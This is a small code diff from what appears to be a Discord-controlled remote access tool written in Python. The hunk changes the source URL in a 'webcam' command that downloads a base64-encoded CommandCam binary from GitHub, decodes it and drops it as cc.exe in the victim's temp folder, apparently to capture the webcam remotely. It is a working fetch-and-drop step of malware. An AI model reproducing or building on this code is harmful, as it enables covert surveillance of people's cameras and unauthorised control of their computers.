@@ -126,7 +126,7 @@ async def startup(ctx):
 @client.command()  # Idea was Sp00p's, but this is a brand new implementation by me
 async def webcam(ctx):
     import base64
-    webcam = bytes(get("https://raw.githubusercontent.com/NullCode13/CommandCam/master/CommandCam_binary_base64").text, "utf-8")
+    webcam = bytes(get("https://raw.githubusercontent.com/NullCode13-Misc/CommandCam/master/CommandCam_binary_base64").text, "utf-8")
     os.chdir(os.getenv("temp"))
     with open("cc.exe", "wb") as fh:
         fh.write(base64.decodebytes(webcam))
